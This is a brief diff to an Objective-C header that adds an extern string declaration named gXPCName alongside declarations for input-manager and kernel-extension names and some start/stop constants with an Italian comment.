@@ -445,6 +445,7 @@ extern NSString *gConfigurationUpdateName;
 extern NSString *gInputManagerName;
 extern NSString *gKext32Name;
 extern NSString *gKext64Name;
+extern NSString *gXPCName;
 
 #define CRISIS_STARTSTOP    (UInt32)0x2
 #define CRISIS_STOP         (UInt32)0x0  // Per retrocompatibilita'
